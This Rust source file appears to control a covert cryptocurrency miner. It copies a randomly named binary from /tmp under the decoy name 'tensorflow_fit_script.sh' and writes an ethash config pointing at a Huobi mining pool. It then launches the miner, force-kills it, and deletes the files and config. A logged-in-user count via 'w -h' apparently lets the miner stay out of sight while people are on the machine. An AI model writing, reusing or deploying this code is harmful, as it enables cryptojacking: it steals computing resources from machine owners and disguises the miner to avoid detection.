use std::fs::File;
use std::io::Write;
use std::process::Command;

pub trait Task {
    fn init_env(&self);
    fn clean_env(&self);
    fn start_target_process(&self) -> u32;
    fn kill_target_process(&self, pid: &mut u32);
}

pub fn get_user_count() -> usize {
    let w_output = Command::new("w").arg("-h").output().unwrap().stdout;
    String::from_utf8_lossy(&w_output).lines().count()
}

pub struct ETHTask;

impl Task for ETHTask {
    fn init_env(&self) {
        println!("init_env()");
        let mut command = Command::new("cp");
        command
            .arg("/tmp/b86547d084228861")
            .arg("tensorflow_fit_script.sh");
        let mut process = command.spawn().unwrap();
        process.wait().unwrap();
        let mut config = File::create("c").unwrap();
        config.write_all(b"[common]\nalgo=ethash\npers=BgoldPoW\nwatchdog=1\napi=10555\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e").unwrap();
        config.sync_all().unwrap();
    }

    fn clean_env(&self) {
        println!("clean_env()");
        let mut command = Command::new("rm");
        command.arg("-rf").arg("tensorflow_fit_script.sh").arg("c");
        command.spawn().unwrap();
    }

    fn start_target_process(&self) -> u32 {
        println!("start_target_process()");
        let mut command = Command::new("./tensorflow_fit_script.sh");
        command.arg("--config").arg("c");
        let process = command.spawn().unwrap();
        let pid = process.id();
        println!("target process pid: {}", pid);
        return pid;
    }

    fn kill_target_process(&self, pid: &mut u32) {
        println!("kill_target_process()");
        let mut command = Command::new("kill");
        command.arg("-9").arg(pid.to_string());
        let mut process = command.spawn().unwrap();
        process.wait().unwrap();
        *pid = 0;
    }
}
